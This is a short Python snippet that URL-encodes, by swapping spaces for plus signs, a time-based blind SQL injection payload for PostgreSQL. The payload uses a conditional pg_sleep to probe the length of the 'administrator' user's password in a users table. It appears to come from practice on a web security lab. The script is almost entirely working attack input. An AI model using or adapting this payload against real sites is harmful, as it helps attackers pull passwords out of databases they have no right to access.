def replace_space(text):
    return text.replace(" ","+")

text = " select case when (1=1) then pg_sleep(5) else pg_sleep(0) end from users where username = 'administrator' and length(password)+>+1--;"
new_text = replace_space(text)
print(new_text)
"gg"

